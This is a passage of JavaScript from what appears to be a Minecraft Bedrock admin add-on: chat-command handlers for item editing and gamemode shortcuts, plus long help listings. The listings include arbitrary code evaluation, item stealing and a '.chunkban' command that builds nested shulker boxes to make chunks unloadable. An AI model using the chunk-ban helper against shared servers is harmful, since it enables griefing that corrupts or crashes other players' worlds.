                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).amount = Number(command.split(" ").slice(2).join(" "));
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item count":
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).amount = Number(command.split(" ").slice(2).join(" "));
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            case "item nameTag":
                                let nameb = command.split(" ").slice(2).join(" ").escapeCharactersB(true);
                                if (nameb.e != undefined) {
                                    nameb.e.forEach((e) => { player.sendMessage(String(e + e.stack)); });
                                }
                                ;
                                system.run(() => { try {
                                    player.getComponent("inventory").container.getSlot(player.selectedSlot).nameTag = nameb.v;
                                }
                                catch (e) {
                                    console.error(e, e.stack);
                                    player.sendMessage("§c" + e + e.stack);
                                } });
                                break;
                            default:
                                eventData.sender.sendMessage("§cSyntax error: Unexpected \"" + command.split(" ").slice(1).join(" ") + "\": at \"\\item >>" + command.split(" ").slice(1).join(" ") + "<<\"");
                                break;
                        }
                    }
                    catch (e) {
                        console.error(e, e.stack);
                        player.sendMessage(e + e.stack);
                    }
                }
                break;
            case !!switchTest.match(/^gmc$/):
                eventData.cancel = true;
                try {
                    player.runCommandAsync("/gamemode c");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set gamemode to creative. ")); }); });
                break;
            case !!switchTest.match(/^gms$/):
                eventData.cancel = true;
                try {
                    player.runCommandAsync("/gamemode s");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set gamemode to survival. ")); }); });
                break;
            case !!switchTest.match(/^gma$/):
                eventData.cancel = true;
                try {
                    player.runCommandAsync("/gamemode a");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set gamemode to adventure. ")); }); });
                break;
            case !!switchTest.match(/^gmd$/):
                eventData.cancel = true;
                try {
                    player.runCommandAsync("/gamemode d");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set gamemode to default. ")); }); });
                break;
            case !!switchTest.match(/^gmp$/):
                eventData.cancel = true;
                try {
                    player.runCommandAsync("/gamemode spectator");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set gamemode to spectator. ")); }); });
                break;
            case !!switchTest.match(/^gmr$/):
                eventData.cancel = true;
                switch (Math.round(Math.random() * 4)) {
                    case 0:
                        try {
                            player.runCommandAsync("/gamemode c");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 1:
                        try {
                            player.runCommandAsync("/gamemode s");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 2:
                        try {
                            player.runCommandAsync("/gamemode a");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 3:
                        try {
                            player.runCommandAsync("/gamemode d");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 4:
                        try {
                            player.runCommandAsync("/gamemode spectator");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                ; /*
                    try{player.runCommandAsync("/gamemode random")}catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}*/
                system.run(() => { targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage(String("{§l§dCMDFEED§r§f}[" + player.name + "§r§f]: Set gamemode to random. ")); }); });
                break; /*
            case !!switchTest.match(/^settings$/):
                eventData.cancel = true;
                switch (Math.min(newMessage.split(" ").length, 3)){
                    case 3:
                        try{player.runCommandAsync("/scriptevent andexdb:setWorldDynamicPropertyB " + newMessage.slice(10).split(" ")[0] + "|" + newMessage.slice(newMessage.split(" ")[1].length+10))}catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                        try{eventData.sender.sendMessage("Set " + newMessage.split(" ")[1] + " to " + newMessage.slice(newMessage.split(" ")[1].length+10)); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                    break;
                    case 2:
                        try{eventData.sender.sendMessage("Setting " + newMessage.split(" ")[1] + ": " + world.getDynamicProperty(newMessage.split(" ")[1])); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                    break;
                }
            break; */
            case !!switchTest.match(/^playersettings$/):
                eventData.cancel = true;
                switch (Math.min(newMessage.split(" ").length, 3)) {
                    case 3:
                        try {
                            player.setDynamicProperty(newMessage.split(" ")[1], newMessage.slice(newMessage.split(" ")[1].length + 17));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Set " + newMessage.split(" ")[1] + " to " + newMessage.slice(newMessage.split(" ")[1].length + 17));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 2:
                        try {
                            eventData.sender.sendMessage("Setting " + newMessage.split(" ")[1] + ": " + player.getDynamicProperty(newMessage.split(" ")[1]));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^entitysettings$/):
                eventData.cancel = true;
                switch (Math.min(newMessage.split(" ").length, 3)) {
                    case 3:
                        try {
                            targetSelectorAllListB(newMessage.split(" ")[1].replaceAll("\\s", " "), "", Number(eventData.sender.id)).forEach((currentEntitySelectedValues) => { currentEntitySelectedValues.setDynamicProperty(newMessage.split(" ")[1], newMessage.slice(newMessage.split(" ")[1].length + 17)); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Set " + newMessage.split(" ")[2] + " to " + newMessage.slice(newMessage.split(" ")[2].length + 17));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 2:
                        try {
                            eventData.sender.sendMessage("Setting " + newMessage.split(" ")[2] + ": " + player.getDynamicProperty(newMessage.split(" ")[2]));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^entitysettingsuuidselection$/):
                eventData.cancel = true;
                switch (Math.min(newMessage.split(" ").length, 3)) {
                    case 3:
                        try {
                            world.getDimension(DimensionTypes.getAll().find((dimension) => (world.getDimension(dimension.typeId).getEntities().find((entity) => (entity.id == newMessage.split(" ")[1])))).typeId).getEntities().find((entity) => (entity.id == newMessage.split(" ")[1])).setDynamicProperty(newMessage.split(" ")[1], newMessage.slice(newMessage.split(" ")[1].length + 30));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Set " + newMessage.split(" ")[1] + " to " + newMessage.slice(newMessage.split(" ")[1].length + 17));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case 2:
                        try {
                            eventData.sender.sendMessage("Setting " + newMessage.split(" ")[1] + ": " + player.getDynamicProperty(newMessage.split(" ")[1]));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^help$/):
                eventData.cancel = true;
                switch (switchTestB.split(" ").slice(0, 2).join(" ").toLowerCase()) {
                    case "help":
                        eventData.sender.sendMessage("§2Help Chat Command Syntax§f\n.help scriptevent\n.help cmd <command: CommandName>\n.help command <command: CommandName>\n.help chatcommands\n.help chatcommandsb\n.help javascriptfunctions\n.help js <JavaScriptFunctionVariableConstantOrClassName: string>\n.help itemjsonformat\n.help itemjsonformatcmpr\n.help itemjsonformatsimplified§c\n.help entityevents\n.help items\n.help tags\n.help debugsticks".replaceAll("\n.", ("\n" + (world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"))));
                        break;
                    case "help scriptevent":
                        eventData.sender.sendMessage("§2/scriptevent Syntax§f\n/scriptevent andexdb:debugStick <message: string>");
                        break;
                    case "help cmd":
                        eventData.sender.sendMessage(getCommandHelpPage(switchTestB.split(" ").slice(2).join(" ")));
                        break;
                    case "help command":
                        eventData.sender.sendMessage(getCommandHelpPage(switchTestB.split(" ").slice(2).join(" ")));
                        break;
                    case "help chatcommands":
                        eventData.sender.sendMessage(`§2Chat Commands Syntax§r
.binvsee - §oDisplays the contents of the specified block's inventory. 
.clear - §oClears a player's inventory. 
.clearenderchest - §oClears a player's ender chest. 
.clearenderchestslot - §oClears a slot of a player's ender chest. 
.cloneitem - §oClones the item in your hand to the specified player's inventory. 
.compressitems - §oCompresses your inventory into 2 chests and inserts those chests into your inventory. 
.compressitemsshulker - §oCompresses your inventory into 2 shulker boxes and inserts those shulker boxes into your inventory. 
.compressitemscontainer - §oCompresses your inventory into a specified container type and inserts those containers into your inventory. 
.copyitem - §oCopies the item in your hand to the specified slot of the specified player's inventory. 
.createexplosion - §oCreates an explosion. 
.datapickblock - §oPick Blocks the block that your are looking at while copying the nbt data of the block as well, just like using the pick block button while holding CTRL on your keyboard. 
.drain - §oDrains liquids in the specified radius. 
.dupeitem - §oDuplicates teh item in your hand. 
.einvsee - §oDisplays the contents of the specified entity's inventory. 
.ecinvsee - §oScans a player's ender chest and displays the contents of it. 
.ecinvseec - §oScans a player's ender chest and displays the contents of it. 
.eval - §oRuns the specified JavaScript Script/ScriptAPI Code. 
.extinguish - §oExtinguishes fire in the specified radius. 
.fill - §oFills all or parts of a reigon with a specific block, can use any block type including NBT Editor only ones. 
.fillillegal - §oFills a player's inventory with illegal items. 
.fillinventory - §oFills a player's inventory with items based on the provided itemJSON. 
.filljunk - §oFills a player's inventory with junk items. 
.fillop - §oFills a player's inventory with op items. 
.fillrandom - §oFills a player's inventory with random items. 
.give - §oGives you a specified amount of an item of a specified type. 
.giveb - §oGives you an item stack with a specified type and stack size in your next empty inventory slot. 
.givec - §oGives you an item stack based on the provided itemJSON in your next empty inventory slot. 
.getuuid - §oGets the UUID of the specified entity. 
.gma - §oSets your gamemode to adventure. 
.gmc - §oSets your gamemode to creative. 
.gmd - §oSets your gamemode to default. 
.gmp - §oSets your gamemode to spectator. 
.gmr - §oSets your gamemode to a random gamemode. 
.gms - §oSets your gamemode to survival. 
.h# - §oSwaps your hotbar with the specified hotbar preset. 
.hset - §oSets a hotbar preset. 
.idtfill - §oFills all or parts of a reigon with a specific block, with no limits, also temporarily spawns a tickingarea to load in chunks around it, also allows specifying the integrity of the fill, can use any block type including NBT Editor only ones. 
.ifill - §oFills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. 
.ifillb - §oFills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. 
.ifillc - §oFills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. 
.igfill - §oFills all or parts of a reigon with a specific block, with no limits, uses a generator function so it never will produce a script hang error but it is extremely slow, can use any block type including NBT Editor only ones. 
.invfillillegal - §oFills a player's inventory with illegal items. 
.invfill - §oFills a player's inventory with items based on the provided itemJSON. 
.invfilljunk - §oFills a player's inventory with junk items. 
.invfillop - §oFills a player's inventory with op items. 
.invfillrandom - §oFills a player's inventory with random items. 
.invsee - §oDisplays the contents of the specified player's inventory. 
.invseeuuidmode - §oDisplays the contents of the inventory of the entity with the specified UUID. 
.invshuffle - §oShuffles the inventory of the specified player
.invswap - §oSwaps the inventories of 2 players. 
.invswapb - §oSwaps the inventories of 2 players. 
.iogfill - §oFills all or parts of a reigon with a specific block, with no limits, uses a generator function so it never will produce a script hang error but it is extremely slow, can use any block type including NBT Editor only ones. 
.item - §oSuper advanced item modification command. 
.itfill - §oFills all or parts of a reigon with a specific block, with no limits, also temporarily spawns a tickingarea to load in chunks around it, can use any block type including NBT Editor only ones. 
.itfillc - §oFills all or parts of a reigon with a specific block, with no limits, also temporarily spawns a tickingarea to load in chunks around it, can use any block type including NBT Editor only ones. 
.mainmenu - §oOpens up the main menu. 
.managecommands - §oOpens up the commands editor menu. 
.manageplayers - §oOpens up the manage players menu. 
.managescriptautoeval - §oOpens up the Script Auto Eval settings menu. 
.offlineinfo - §oDisplays the saved player data of the specified player. 
.offlineuuidinfo - §oDisplays the saved player data of the player with the specified UUID. 
.offlineinvsee - §oDisplays the saved contents of the specified player's inventory. 
.offlineuuidinvsee - §oDisplays the saved contents of the inventory of the player with the specified UUID. 
.printlayers - §oDisplays a list of all the blocks at your specified x and z coordinates. 
.remexp - §oRemoves explosive blocks in the specified radius. 
.run - §oRuns the specified command. 
.scanenderchest - §oScans a player's ender chest and displays the contents of it. 
.scanenderchestc - §oScans a player's ender chest and displays the contents of it. 
.scnendchst - §oScans a player's ender chest and displays the contents of it. 
.scnendchstc - §oScans a player's ender chest and displays the contents of it. 
.setitem - §oReplaces the item stack in the specified inventory slot with an item stack with a specified type and stack size. 
setitemb - §oReplaces the item stack in the specified inventory slot with an item stack based on the provided itemJSON. 
.settings - §oOpens up the settings menu. 
.shuffleinventory - §oShuffles the inventory of the specified player. 
.swapinventories - §oSwaps the inventories of 2 players. 
.swapinventoriesb - §oSwaps the inventories of 2 players. 
.swapitems - §oSwaps an item in a slot of one player's inventory with another slot of another player's inventory. 
.takeitem - §oSteals an item from another player's inventory and puts it into yoru inventory. 
.terminal - §oOpens up the command runner/terminal menu. 
.transferitem - §oTransfers the item in your hand to the specified player's inventory. 
.top - §oTeleports on top of the highest solid block at your x and z coordinates. 
.up - §oTeleports up the specified number of blocks and places glass below you if placeGlass is not set to false. 
.warp - §oWarps to the specified global warp. 
.warplist - §oLists all global warps. 
.warplistdetails - §oLists all global warps with more details. 
.warplistrawdata - §oLists the raw data of the global warps. 
.warpremove - §oRemoves the specified global warp. 
.warpreset - §oRemoves all global warps. 
.warpset - §oSets a global warp. 
.w - §oWarps to the specified private warp. 
.wlist - §oLists all private warps. 
.wlistdetails - §oLists all private warps with more details. 
.wlistrawdata - §oLists the raw data of the private warps. 
.wremove - §oRemoves the specified private warp. 
.wreset - §oRemoves all private warps. 
.wset - §oSets a private warp. 
§cDangerous Commands: §4
.chunkban - §oFills a shulker box with the item in your first hotbar slot and put that shulker box into your first hotbar slot, and repeats this the specified number of times, this can be used to create a chunk ban. 
§bCommands that require "8Crafter's Entity Scale, NBT, and Behavior Modifier, Bossbar, and Morph Addon" in order to function: §6
.morph - §oMorphs into the morph with the specified ID. 
.scale - §oSets your scale value to the specified amount. 
.tint - §oTints the specified player's skin the specified color, or makes it glow, and optionally adjusts the opacity of their skin. 
.tps - §oDisplays the TPS. 
.visualscale - §oSets your visual scale (the one that does not actually change your hitbox size) to the specified amount. 
.visualscaleenabled - §oEnables or diables your visual scaling. `.replaceAll("\n.", ("\n" + (world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"))));
                        break;
                    case "help chatcommandsb":
                        eventData.sender.sendMessage(`§2Chat Commands Syntax§f\n.give <item: itemType> <amount: int>
.giveb <item: itemType> <amount: int>
.givec <itemJSON: itemJSON>
.setitem <item: itemType> <amount: int> <slot: int>
.invsee <target: targetSelector>
.offlineinfo <playerName: string>
.offlineuuidinfo <playerUUID: int>
.offlineinvsee <playerName: string>
.offlineuuidinvsee <playerUUID: int>
.binvsee <dimension: dimension|~> <block: x y z>
.einvsee <targetSelector: targetSelector>
.invseeuuidmode <entityUUID: int>
.h<presetId: float> <containerRow: float>
.hset <presetId: float> [dimensionId: string] [x: float] [y: float] [z: float]
.gmc
.gms
.gma
.gmd
.gmp
.gmr
.getuuid <target: target>
.warpset <dimension: dimension> <x: float> <y: float> <z: float> <name: escapableString>
.warp <name: escapableString>
.warpremove <name: escapableString>
.warpreset
.warplist
.warplistdetails
.warplistrawdata
.wset <dimension: dimension> <x: float> <y: float> <z: float> <name: escapableString>
.w <name: escapableString>
.wremove <name: escapableString>
.wreset
.wlist
.wlistdetails
.wlistrawdata
.run <delayTicks: int> <command: command>
.eval <ScriptAPICode: JavaScript>
.top
.up <count: int> [placeGlass: bool]
.printlayers
.mainmenu
.settings
.datapickblock`.replaceAll("\n.", ("\n" + (world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\"))));
                        break;
                    case "help javascriptfunctions":
                        eventData.sender.sendMessage(`§2List of JavaScript Functions, Constants, Variables, and Classes§f\n{main: [${Object.keys(main).join(", ")}], coords: [${Object.keys(coords).join(", ")}], cmds: [${Object.keys(cmds).join(", ")}], bans: [${Object.keys(bans).join(", ")}], uis: [${Object.keys(uis).join(", ")}], playersave: [${Object.keys(playersave).join(", ")}], spawnprot: [${Object.keys(spawnprot).join(", ")}]}`);
                        break;
                    case "help jsfunction":
                        eventData.sender.sendMessage(`§2${newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length).split(" ").slice(2).join(" ")} js object definition§f\n${([...Object.entries(main), ...Object.entries(coords), ...Object.entries(cmds), ...Object.entries(bans), ...Object.entries(uis), ...Object.entries(playersave), ...Object.entries(spawnprot)].find(v => v[0] == newMessage.slice(String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\").length).split(" ").slice(2).join(" ")) ?? [, "§cError: The specified javascript function/constant/variable/class does not exist, check your spelling and capitallization. "])[1].toString().replaceAll("\\n", "\n")}`);
                        break;
                    case "help itemjsonformat":
                        eventData.sender.sendMessage(`itemJSON Format: 
export interface ItemJSONParseInput {
    "name"?: string,
    "minecraft:name"?: string,
    "nameTag"?: string,
    "minecraft:nameTag"?: string,
    "lore"?: string[],
    "minecraft:lore"?: string[],
    "description"?: string[],
    "minecraft:description"?: string[],
    "count"?: number,
    "minecraft:count"?: number,
    "amount"?: number,
    "minecraft:amount"?: number,
    "keepOnDeath"?: boolean,
    "minecraft:keepOnDeath"?: boolean,
    "keepondeath"?: boolean,
    "minecraft:keepondeath"?: boolean,
    "keep_on_death"?: boolean,
    "minecraft:keep_on_death"?: boolean,
    "lockMode"?: ItemLockMode,
    "minecraft:lockMode"?: ItemLockMode,
    "lockmode"?: ItemLockMode,
    "minecraft:lockmode"?: ItemLockMode,
    "lock_mode"?: ItemLockMode,
    "minecraft:lock_mode"?: ItemLockMode,
    "itemLockMode"?: ItemLockMode,
    "minecraft:itemLockMode"?: ItemLockMode,
    "itemlockmode"?: ItemLockMode,
    "minecraft:itemlockmode"?: ItemLockMode,
    "item_lock_mode"?: ItemLockMode,
    "minecraft:item_lock_mode"?: ItemLockMode,
    "canPlaceOn"?: string[],
    "minecraft:canPlaceOn"?: string[],
    "canplaceon"?: string[],
    "minecraft:canplaceon"?: string[],
    "can_place_on"?: string[],
    "minecraft:can_place_on"?: string[],
    "canDestroy"?: string[],
    "minecraft:canDestroy"?: string[],
    "candestroy"?: string[],
    "minecraft:candestroy"?: string[],
    "can_destroy"?: string[],
    "minecraft:can_destroy"?: string[],
    "components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "minecraft:add"?: Enchantment|Enchantment[],
            "addEnchantment"?: Enchantment|Enchantment[],
            "minecraft:addEnchantment"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "minecraft:addList"?: Enchantment[],
            "addEnchantments"?: Enchantment[],
            "minecraft:addEnchantments"?: Enchantment[],
            "remove"?: Enchantment,
            "minecraft:remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "minecraft:removeEnchantments"?: Enchantment,
            "clear"?: any,
            "minecraft:clear"?: any,
            "clearAll"?: any,
            "minecraft:clearAll"?: any,
            "removeAll"?: any,
            "minecraft:removeAll"?: any,
            "removeAllEnchantments"?: any,
            "minecraft:removeAllEnchantments"?: any
        },
        "minecraft:enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "minecraft:add"?: Enchantment|Enchantment[],
            "addEnchantment"?: Enchantment|Enchantment[],
            "minecraft:addEnchantment"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "minecraft:addList"?: Enchantment[],
            "addEnchantments"?: Enchantment[],
            "minecraft:addEnchantments"?: Enchantment[],
            "remove"?: Enchantment,
            "minecraft:remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "minecraft:removeEnchantments"?: Enchantment,
            "clear"?: any,
            "minecraft:clear"?: any,
            "clearAll"?: any,
            "minecraft:clearAll"?: any,
            "removeAll"?: any,
            "minecraft:removeAll"?: any,
            "removeAllEnchantments"?: any,
            "minecraft:removeAllEnchantments"?: any
        },
        "durability"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "minecraft:durability"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "minecraft:damage"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "cooldown"?: any,
        "minecraft:cooldown"?: any,
        "food"?: any,
        "minecraft:food"?: any
    },
    "minecraft:components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "minecraft:add"?: Enchantment|Enchantment[],
            "addEnchantment"?: Enchantment|Enchantment[],
            "minecraft:addEnchantment"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "minecraft:addList"?: Enchantment[],
            "addEnchantments"?: Enchantment[],
            "minecraft:addEnchantments"?: Enchantment[],
            "remove"?: Enchantment,
            "minecraft:remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "minecraft:removeEnchantments"?: Enchantment,
            "clear"?: any,
            "minecraft:clear"?: any,
            "clearAll"?: any,
            "minecraft:clearAll"?: any,
            "removeAll"?: any,
            "minecraft:removeAll"?: any,
            "removeAllEnchantments"?: any,
            "minecraft:removeAllEnchantments"?: any
        },
        "minecraft:enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "minecraft:add"?: Enchantment|Enchantment[],
            "addEnchantment"?: Enchantment|Enchantment[],
            "minecraft:addEnchantment"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "minecraft:addList"?: Enchantment[],
            "addEnchantments"?: Enchantment[],
            "minecraft:addEnchantments"?: Enchantment[],
            "remove"?: Enchantment,
            "minecraft:remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "minecraft:removeEnchantments"?: Enchantment,
            "clear"?: any,
            "minecraft:clear"?: any,
            "clearAll"?: any,
            "minecraft:clearAll"?: any,
            "removeAll"?: any,
            "minecraft:removeAll"?: any,
            "removeAllEnchantments"?: any,
            "minecraft:removeAllEnchantments"?: any
        },
        "durability"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "minecraft:durability"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "minecraft:damage"?: {
            "durability"?: number,
            "minecraft:durability"?: number,
            "setDurability"?: number,
            "minecraft:setDurability"?: number,
            "damage"?: number,
            "minecraft:damage"?: number,
            "setDamage"?: number,
            "minecraft:setDamage"?: number,
            "repair"?: number,
            "minecraft:repair"?: number,
            "setDurabilityToMax"?: any,
            "minecraft:setDurabilityToMax"?: any
        },
        "cooldown"?: any,
        "minecraft:cooldown"?: any,
        "food"?: any,
        "minecraft:food"?: any
    }
    force?: boolean
    source?: {
        type?: string,
        targetSelector?: string,
        targetSelectorExecutionLocation?: DimensionLocation,
        targetSelectorSourceEntity?: Entity,
        player?: string,
        entityAtBlock?: DimensionLocation,
        entityType?: string,
        entityTypeId?: string,
        entityId?: string|number,
        block?: DimensionLocation,
        slot?: number,
        id?: string,
        itemId?: string,
        count?: number,
        amount?: number
    },
    type?: string,
    id?: string,
    itemId?: string,
    new?: [string, number?],
    dynamicProperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    properties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    itemproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    itemProperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>
    clearAllDynamicProperties?: any,
    clearDynamicProperties?: any,
    clearalldynamicproperties?: any,
    cleardynamicproperties?: any,
    removeDynamicProperties?: string[],
    removedynamicproperties?: string[],
    removeDynamicProperty?: string,
    removedynamicproperty?: string,
    "minecraft:dynamicProperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    "minecraft:dynamicproperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    "minecraft:properties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    "minecraft:itemProperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    "minecraft:itemproperties"?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    "minecraft:clearAllDynamicProperties"?: any,
    "minecraft:clearDynamicProperties"?: any,
    "minecraft:clearalldynamicproperties"?: any,
    "minecraft:cleardynamicproperties"?: any,
    "minecraft:removeDynamicProperties"?: string[],
    "minecraft:removedynamicproperties"?: string[],
    "minecraft:removeDynamicProperty"?: string,
    "minecraft:removedynamicproperty"?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
